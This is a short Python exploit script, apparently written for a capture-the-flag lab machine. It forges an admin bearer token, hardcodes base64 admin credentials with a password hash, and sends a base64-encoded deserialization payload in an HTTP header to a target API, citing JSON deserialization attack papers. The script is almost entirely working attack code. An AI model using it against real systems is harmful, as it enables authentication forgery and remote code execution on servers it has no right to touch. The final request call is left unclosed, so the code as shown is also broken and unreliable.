#!/usr/bin/python3

##
## ___forge_bearer_token_
##  __https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
##   _https://owasp.org/www-pdf-archive/Marshaller_Deserialization_Attacks.pdf.pdf
##

from base64 import b64decode, b64encode
import requests
import argparse

parser = argparse.ArgumentParser(description='pass the attack script.')
parser.add_argument("-s", '--script', required=True, 
                    help='script to process for the attack')
args = parser.parse_args()

admin_token="eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0="
#Base64 encode the provided payload file
def create_payload(package):
    payload = open(package, 'rb').read()
    return b64encode(payload).decode('UTF-8')

#Send the payload file
print("Sending payload: ", args.script)
requests.get('http://10.10.10.158/api/Account', 
                headers={
                    'Cookie': 'OAuth2='+admin_token, 
                    'Bearer': create_payload(args.script)
                    
###################################
###################################
##
##
